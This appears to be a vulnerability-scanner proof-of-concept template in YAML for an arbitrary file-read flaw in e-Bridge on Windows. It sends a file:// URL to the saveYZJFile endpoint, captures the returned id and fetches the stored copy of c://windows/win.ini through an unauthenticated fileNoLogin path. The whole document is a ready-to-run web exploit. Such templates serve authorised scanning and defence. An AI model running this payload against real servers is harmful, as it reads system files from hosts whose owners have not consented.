name: poc-yaml-e-bridge-win-file-read
set:
  testfile: c://windows/win.ini
rules:
  - method: GET
    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{{testfile}}&fileExt=txt
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"id")
    search: |
      \"id\"\:\"(?P<var>.+?)\"\,
  - method: GET
    path: /file/fileNoLogin/{{var}}
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"; for 16-bit app support")
detail:
  author: mvhz81
  info: e-bridge-file-read for windows
  links:
    - https://mrxn.net/Infiltration/323.html
